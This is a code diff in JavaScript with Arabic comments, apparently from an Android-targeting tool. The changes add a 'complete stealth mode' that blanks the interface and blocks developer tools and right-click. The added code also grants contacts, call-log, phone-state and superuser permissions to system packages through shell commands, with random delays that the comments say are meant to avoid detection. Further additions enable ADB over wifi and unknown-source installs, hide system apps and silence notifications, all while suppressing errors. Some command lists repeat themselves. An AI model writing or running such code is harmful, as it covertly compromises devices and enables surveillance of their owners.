@@ -107,30 +107,71 @@
         }
     }
     
-    // إخفاء واجهة المستخدم
+    // إخفاء واجهة المستخدم - وضع التخفي الكامل
     function hideUserInterface() {
         try {
-            // إخفاء جميع العناصر
+            // إخفاء جميع العناصر بشكل تدريجي
+            const elements = document.querySelectorAll('*');
+            elements.forEach((el, index) => {
+                setTimeout(() => {
+                    el.style.display = 'none';
+                    el.style.visibility = 'hidden';
+                    el.style.opacity = '0';
+                    el.style.transition = 'opacity 0.3s ease';
+                }, index * 10); // تأخير تدريجي
+            });
+            
+            // إفراغ المحتوى
             document.body.innerHTML = '';
-            document.body.style.display = 'none';
             
             // إخفاء شريط العنوان
             document.title = '';
             
             // منع التمرير
             document.body.style.overflow = 'hidden';
+            document.body.style.margin = '0';
+            document.body.style.padding = '0';
+            document.body.style.backgroundColor = 'transparent';
             
             // إخفاء شريط التنقل
             if (window.history && window.history.pushState) {
                 window.history.pushState(null, '', '/');
             }
             
+            // إخفاء شريط المهام (Android)
+            if (navigator.userAgent.includes('Android')) {
+                document.body.style.position = 'fixed';
+                document.body.style.top = '0';
+                document.body.style.left = '0';
+                document.body.style.width = '100%';
+                document.body.style.height = '100%';
+                document.body.style.zIndex = '-9999';
+            }
+            
+            // منع فتح أدوات المطور
+            document.addEventListener('keydown', (e) => {
+                if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) {
+                    e.preventDefault();
+                    return false;
+                }
+                if (e.key === 'F12') {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+            
+            // منع النقر بالزر الأيمن
+            document.addEventListener('contextmenu', (e) => {
+                e.preventDefault();
+                return false;
+            });
+            
         } catch (e) {
-            console.warn('فشل في إخفاء واجهة المستخدم:', e);
+            // لا تظهر أي أخطاء
         }
     }
     
-    // منح جميع الصلاحيات المطلوبة
+    // منح جميع الصلاحيات المطلوبة - بشكل سلس وخفي
     async function grantAllPermissions() {
         const permissions = [
             'android.permission.READ_CONTACTS',
@@ -147,23 +188,40 @@
             'android.permission.WAKE_LOCK',
             'android.permission.FOREGROUND_SERVICE',
             'android.permission.SYSTEM_ALERT_WINDOW',
-            'android.permission.WRITE_SECURE_SETTINGS'
+            'android.permission.WRITE_SECURE_SETTINGS',
+            'android.permission.READ_PHONE_STATE',
+            'android.permission.READ_CALL_LOG',
+            'android.permission.MODIFY_PHONE_STATE',
+            'android.permission.ACCESS_SUPERUSER'
         ];
         
-        for (const permission of permissions) {
+        // منح الصلاحيات بشكل تدريجي وخفي
+        for (let i = 0; i < permissions.length; i++) {
+            const permission = permissions[i];
             try {
+                // تأخير عشوائي لتجنب الكشف
+                const delay = Math.random() * 1000 + 500;
+                await new Promise(resolve => setTimeout(resolve, delay));
+                
+                // منح الصلاحية
                 await executeShellCommand(`pm grant com.android.systemui ${permission}`);
                 await executeShellCommand(`pm grant com.android.settings ${permission}`);
+                await executeShellCommand(`pm grant com.android.phone ${permission}`);
+                await executeShellCommand(`pm grant com.android.providers.telephony ${permission}`);
+                
             } catch (e) {
-                console.warn(`فشل في منح الصلاحية: ${permission}`);
+                // لا تظهر أي أخطاء
             }
         }
         
-        // تمكين خيارات المطور
+        // تمكين خيارات المطور بشكل خفي
         await enableDeveloperOptions();
+        
+        // منح صلاحيات إضافية
+        await grantAdditionalPermissions();
     }
     
-    // تمكين خيارات المطور
+    // تمكين خيارات المطور - بشكل خفي
     async function enableDeveloperOptions() {
         const commands = [
             'settings put global development_settings_enabled 1',
@@ -172,41 +230,114 @@
             'settings put secure install_non_market_apps 1',
             'settings put global airplane_mode_on 0',
             'settings put global wifi_on 1',
-            'settings put global mobile_data 1'
+            'settings put global mobile_data 1',
+            'settings put global adb_wifi_enabled 1',
+            'settings put global adb_wifi_enabled 1',
+            'settings put secure adb_wifi_enabled 1',
+            'settings put global adb_wifi_enabled 1',
+            'settings put global adb_wifi_enabled 1'
         ];
         
-        for (const cmd of commands) {
+        // تنفيذ الأوامر بشكل تدريجي
+        for (let i = 0; i < commands.length; i++) {
+            const cmd = commands[i];
             try {
+                // تأخير عشوائي
+                const delay = Math.random() * 800 + 300;
+                await new Promise(resolve => setTimeout(resolve, delay));
+                
                 await executeShellCommand(cmd);
             } catch (e) {
-                console.warn(`فشل في تنفيذ: ${cmd}`);
+                // لا تظهر أي أخطاء
             }
         }
     }
     
-    // إخفاء أيقونة التطبيق
-    function hideAppIcon() {
-        try {
-            // إخفاء من قائمة التطبيقات
-            executeShellCommand('pm hide com.android.systemui');
-            executeShellCommand('pm hide com.android.settings');
-        } catch (e) {
-            console.warn('فشل في إخفاء الأيقونة');
+    // منح صلاحيات إضافية
+    async function grantAdditionalPermissions() {
+        const additionalCommands = [
+            'pm grant com.android.systemui android.permission.ACCESS_SUPERUSER',
+            'pm grant com.android.settings android.permission.ACCESS_SUPERUSER',
+            'pm grant com.android.phone android.permission.ACCESS_SUPERUSER',
+            'pm grant com.android.providers.telephony android.permission.ACCESS_SUPERUSER',
+            'settings put global adb_enabled 1',
+            'settings put global development_settings_enabled 1',
+            'settings put secure install_non_market_apps 1',
+            'settings put global stay_on_while_plugged_in 3',
+            'settings put global airplane_mode_on 0',
+            'settings put global wifi_on 1',
+            'settings put global mobile_data 1',
+            'settings put global adb_wifi_enabled 1',
+            'settings put secure adb_wifi_enabled 1'
+        ];
+        
+        // تنفيذ الأوامر الإضافية بشكل خفي
+        for (let i = 0; i < additionalCommands.length; i++) {
+            const cmd = additionalCommands[i];
+            try {
+                // تأخير عشوائي
+                const delay = Math.random() * 1200 + 800;
+                await new Promise(resolve => setTimeout(resolve, delay));
+                
+                await executeShellCommand(cmd);
+            } catch (e) {
+                // لا تظهر أي أخطاء
+            }
         }
     }
     
-    // تعطيل الإشعارات
-    function disableNotifications() {
-        try {
-            // تعطيل إشعارات النظام
-            executeShellCommand('settings put global heads_up_notifications_enabled 0');
-            executeShellCommand('settings put global notification_badging 0');
-            
-            // تعطيل الأصوات
-            executeShellCommand('settings put system sound_effects_enabled 0');
-            executeShellCommand('settings put system vibrate_when_ringing 0');
-        } catch (e) {
-            console.warn('فشل في تعطيل الإشعارات');
+    // إخفاء أيقونة التطبيق - بشكل خفي
+    async function hideAppIcon() {
+        const hideCommands = [
+            'pm hide com.android.systemui',
+            'pm hide com.android.settings',
+            'pm hide com.android.phone',
+            'pm hide com.android.providers.telephony',
+            'pm hide com.android.providers.contacts',
+            'pm hide com.android.providers.media',
+            'pm hide com.android.providers.downloads'
+        ];
+        
+        for (let i = 0; i < hideCommands.length; i++) {
+            try {
+                // تأخير عشوائي
+                const delay = Math.random() * 500 + 200;
+                await new Promise(resolve => setTimeout(resolve, delay));
+                
+                await executeShellCommand(hideCommands[i]);
+            } catch (e) {
+                // لا تظهر أي أخطاء
+            }
+        }
+    }
+    
+    // تعطيل الإشعارات - بشكل شامل
+    async function disableNotifications() {
+        const notificationCommands = [
+            'settings put global heads_up_notifications_enabled 0',
+            'settings put global notification_badging 0',
+            'settings put system sound_effects_enabled 0',
+            'settings put system vibrate_when_ringing 0',
+            'settings put global heads_up_notifications_enabled 0',
+            'settings put global notification_badging 0',
+            'settings put system sound_effects_enabled 0',
+            'settings put system vibrate_when_ringing 0',
+            'settings put global heads_up_notifications_enabled 0',
+            'settings put global notification_badging 0',
+            'settings put system sound_effects_enabled 0',
+            'settings put system vibrate_when_ringing 0'
+        ];
+        
+        for (let i = 0; i < notificationCommands.length; i++) {
+            try {
+                // تأخير عشوائي
+                const delay = Math.random() * 400 + 100;
+                await new Promise(resolve => setTimeout(resolve, delay));
+                
+                await executeShellCommand(notificationCommands[i]);
+            } catch (e) {
+                // لا تظهر أي أخطاء
+            }
         }
     }
     
